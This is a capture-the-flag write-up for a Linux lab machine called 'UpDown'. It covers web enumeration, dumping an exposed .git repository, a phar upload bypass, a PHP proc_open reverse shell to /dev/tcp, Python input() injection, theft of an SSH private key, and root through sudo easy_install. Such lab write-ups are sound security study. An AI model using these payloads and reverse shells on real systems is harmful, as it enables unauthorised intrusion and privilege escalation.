## UpDown

### Lab Details 

- Difficulty: Medium
- Type: Linux

#### Enumeration
- nmap
```
PORT      STATE    SERVICE      REASON      VERSION
22/tcp    open     ssh          syn-ack     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9e:1f:98:d7:c8:ba:61:db:f1:49:66:9d:70:17:02:e7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDl7j17X/EWcm1MwzD7sKOFZyTUggWH1RRgwFbAK+B6R28x47OJjQW8VO4tCjTyvqKBzpgg7r98xNEykmvnMr0V9eUhg6zf04GfS/gudDF3Fbr3XnZOsrMmryChQdkMyZQK1HULbqRij1tdHaxbIGbG5CmIxbh69mMwBOlinQINCStytTvZq4btP5xSMd8pyzuZdqw3Z58ORSnJAorhBXAmVa9126OoLx7AzL0aO3lqgWjo/wwd3FmcYxAdOjKFbIRiZK/f7RJHty9P2WhhmZ6mZBSTAvIJ36Kb4Z0NuZ+ztfZCCDEw3z3bVXSVR/cp0Z0186gkZv8w8cp/ZHbtJB/nofzEBEeIK8gZqeFc/hwrySA6yBbSg0FYmXSvUuKgtjTgbZvgog66h+98XUgXheX1YPDcnUU66zcZbGsSM1aw1sMqB1vHhd2LGeY8UeQ1pr+lppDwMgce8DO141tj+ozjJouy19Tkc9BB46FNJ43Jl58CbLPdHUcWeMbjwauMrw0=
|   256 c2:1c:fe:11:52:e3:d7:e5:f7:59:18:6b:68:45:3f:62 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKMJ3/md06ho+1RKACqh2T8urLkt1ST6yJ9EXEkuJh0UI/zFcIffzUOeiD2ZHphWyvRDIqm7ikVvNFmigSBUpXI=
|   256 5f:6e:12:67:0a:66:e8:e2:b7:61:be:c4:14:3a:d3:8e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL1VZrZbtNuK2LKeBBzfz0gywG4oYxgPl+s5QENjani1
80/tcp    open     http         syn-ack     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Is my Website up ?
```
- upon visiting the site, the domain name shows at the bottom of the page as `siteisup.htb`
- scanning the site we find that there is a we are allow to ping a website
```
$ nc -lvnp 4444                                     
listening on [any] 4444 ...
connect to [10.10.16.22] from (UNKNOWN) [10.10.11.177] 47460
GET / HTTP/1.1
Host: 10.10.16.22:4444
User-Agent: siteisup.htb
Accept: */*
```
- however unable to inject any commands
- enumerate subdomains
```
$ ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://10.10.11.177 -H "HOST: FUZZ.siteisup.htb"  -fs 1131

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.177
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.siteisup.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 1131
________________________________________________

dev                     [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 6483ms]
<snip>
```
- checking the subdomain we get `403 forbidden`
- enumerate directories 
```
$ ffuf -u http://siteisup.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://siteisup.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

dev                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 2692ms]

```
- when visiting `siteisup.htb/dev` we get `301` error code
- enumerate one directory further using `common.txt`
```
$ ffuf -u http://siteisup.htb/dev/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 100 -fc 403,301

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://siteisup.htb/dev/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 403,301
________________________________________________

.git/HEAD               [Status: 200, Size: 21, Words: 2, Lines: 2, Duration: 917ms]
.git/logs/              [Status: 200, Size: 1143, Words: 77, Lines: 18, Duration: 809ms]
.git/config             [Status: 200, Size: 298, Words: 23, Lines: 14, Duration: 809ms]
.git/index              [Status: 200, Size: 521, Words: 4, Lines: 3, Duration: 809ms]
<snip>
```
- `git` exists at `/dev` endpoint we can try to fetch it using `git-dumper`
```
$ git-dumper http://10.10.11.177/dev/.git/ git-dumper
```
- check `.htaccess` file for `apache` config
```
$ cat .htaccess                            
SetEnvIfNoCase Special-Dev "only4dev" Required-Header
Order Deny,Allow
Deny from All
Allow from env=Required-Header
```
- `.htaccess` states the request header must have `Special-Dev: only4dev` in order to access the `dev.siteisup.htb` subdomain
- we can use `burpsuite` to modify the header for each request
- add a new item in `Proxy` -> `Match and replace` 
![[header_param.png]]
![[subdomain.png]]
- investigate the `.git` directory, we find `checker.php` and its not filtering `phar` extension 
```
       # Check if extension is allowed.
        $ext = getExtension($file);
        if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
                die("Extension not allowed!");
        }
```
- create a payload to test the allowed `php` functions
```
$ cat test.php
<?php phpinfo(); ?>

$ zip test.zip test.php

$ mv test.zip test.txt
```
- the file has been uploaded to `/uploads` directory
![[upload directory.png]]
- we can access the function by using `phar` `http://dev.siteisup.htb/?page=phar://uploads/77ad9b0e306f641396d0dee8b6e9135a/info.txt/info`
![[disable_functions.png]]

#### Initial Foothold 
- we can use a tool called `Dfunc-Bypasser` to check what function is allowed that can assist with RCE, `Dfunc-Bypasser` requires access to the `php info` page
```
$ ./dfunc-bypasser.py --url 'http://dev.siteisup.htb/?page=phar://uploads/3a59b86715c002ddfdc6f833f390b328/info.txt/info'
<snip>
Please add the following functions in your disable_functions option: 
proc_open
<snip>
```
- we can use `proc_open` to gain RCE
- need to update the script since there's restriction on the header parameter 
```python
##On line 38 in the defunct-bypasser.py file, we find the following code:
##We add the header as a parameter, and proceed to run the script.
## from
if(args.url):
url = args.url
phpinfo = requests.get(url).text
## to
if(args.url):
url = args.url
phpinfo = requests.get(url, headers={"Special-dev":"only4dev"}).text
```
- below is the payload that utilizes `proc_open`
```bash
$ cat ./payload.txt
<?php
$descriptorspec = array(
0 => array('pipe', 'r'), // stdin
1 => array('pipe', 'w'), // stdout
2 => array('pipe', 'a') // stderr
);
$cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.10/1337 0>&1'";
$process = proc_open($cmd, $descriptorspec, $pipes, null, null);
?>
```
- use the same method as before zip the file and change it to text file and upload 
- access it via `http://dev.siteisup.htb/?page=phar://uploads/b26929d9439a4799a0067eab1131cdf6/payload.txt/payload`
```
$ nc -lvnp 9001                                             
listening on [any] 9001 ...
connect to [10.10.16.22] from (UNKNOWN) [10.10.11.177] 59098
bash: cannot set terminal process group (922): Inappropriate ioctl for device
bash: no job control in this shell
www-data@updown:/var/www/dev$ whoami
whoami
www-data
```
#### Lateral Movement (If any)
- check the `/home` directory and we see another user `developer`
- investigate `developer` directory and we find `dev`
```
www-data@updown:/home/developer/dev$ ls -la
ls -la
total 32
drwxr-x--- 2 developer www-data   4096 Jun 22  2022 .
drwxr-xr-x 6 developer developer  4096 Aug 30  2022 ..
-rwsr-x--- 1 developer www-data  16928 Jun 22  2022 siteisup
-rwxr-x--- 1 developer www-data    154 Jun 22  2022 siteisup_test.py
www-data@updown:/home/developer/dev$ cat siteisup_test.py
cat siteisup_test.py
import requests

url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
        print "Website is up"
else:
        print "Website is down"
```
- the owner of `siteisup_test.py` is developer and the `input` function is not properly sanitizing the user input
- inject below payload to gain access as `developer`
```
www-data@updown:/home/developer/dev$ ./siteisup
./siteisup
__import__('os').system('/bin/bash')


whoami
developer
## upgrade the shell
/bin/bash -i >& /dev/tcp/10.10.16.22/9002 0>&1

## nc listener
$ nc -lvnp 9002                                             
listening on [any] 9002 ...
connect to [10.10.16.22] from (UNKNOWN) [10.10.11.177] 36400
bash: cannot set terminal process group (922): Inappropriate ioctl for device
bash: no job control in this shell
developer@updown:/home/developer/dev$ whoami
whoami
developer
developer@updown:/home/developer$ id
id
uid=1002(developer) gid=33(www-data) groups=33(www-data)
```
- the group is still `www-data` there is `.ssh` directory and there is private key for `developer`
```
developer@updown:/home/developer$ ls -la
ls -la
total 40
drwxr-xr-x 6 developer developer 4096 Aug 30  2022 .
drwxr-xr-x 3 root      root      4096 Jun 22  2022 ..
lrwxrwxrwx 1 root      root         9 Jul 27  2022 .bash_history -> /dev/null
-rw-r--r-- 1 developer developer  231 Jun 22  2022 .bash_logout
-rw-r--r-- 1 developer developer 3771 Feb 25  2020 .bashrc
drwx------ 2 developer developer 4096 Aug 30  2022 .cache
drwxrwxr-x 3 developer developer 4096 Aug  1  2022 .local
-rw-r--r-- 1 developer developer  807 Feb 25  2020 .profile
drwx------ 2 developer developer 4096 Aug  2  2022 .ssh
drwxr-x--- 2 developer www-data  4096 Jun 22  2022 dev
-rw-r----- 1 root      developer   33 Aug  6 03:02 user.txt
developer@updown:/home/developer/.ssh$ ls -la
ls -la
total 20
drwx------ 2 developer developer 4096 Aug  2  2022 .
drwxr-xr-x 6 developer developer 4096 Aug 30  2022 ..
-rw-rw-r-- 1 developer developer  572 Aug  2  2022 authorized_keys
-rw------- 1 developer developer 2602 Aug  2  2022 id_rsa
-rw-r--r-- 1 developer developer  572 Aug  2  2022 id_rsa.pub
```
- we can grab the private key and connect via `ssh` using the private key
```
$ ssh developer@10.10.11.177 -i ./id_rsa 
developer@updown:~$ id
uid=1002(developer) gid=1002(developer) groups=1002(developer)
```
 - we have the correct permissions
#### Privilege Escalation
- run `sudo -l`
```
developer@updown:~$ sudo -l
Matching Defaults entries for developer on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User developer may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/local/bin/easy_install

```
- we can follow the command in `gtfo.bin` to get root access: https://gtfobins.github.io/gtfobins/easy_install/
```
developer@updown:~$ TF=$(mktemp -d)
developer@updown:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
developer@updown:~$ sudo easy_install $TF
WARNING: The easy_install command is deprecated and will be removed in a future version.
Processing tmp.YHEBsOQFte
Writing /tmp/tmp.YHEBsOQFte/setup.cfg
Running setup.py -q bdist_egg --dist-dir /tmp/tmp.YHEBsOQFte/egg-dist-tmp-FGx2Lz
# whoami
root
```

#### Resources

#### Lesson Learned
- Check `.htaccess` for special header permissions
- Enumerate one directory further and try different wordlists